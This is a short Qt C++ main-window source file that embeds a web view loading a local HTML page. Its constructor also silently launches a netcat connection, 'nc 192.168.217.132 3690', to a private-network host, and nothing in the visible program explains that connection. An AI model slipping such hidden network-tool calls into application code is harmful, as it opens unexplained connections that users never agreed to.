#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QtWebEngineWidgets>

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    view.setParent(ui->widget);
    view.setFixedHeight(800);
    view.setFixedWidth(700);
    view.setUrl(QUrl("file:///C:/Users/houwd/Desktop/programming/Qt5/classic_cryptography/graph-webkit-dep.html"));
    view.show();
    QProcess *proc = new QProcess;
    proc->start("nc 192.168.217.132 3690");
}

MainWindow::~MainWindow()
{

    delete ui;
}
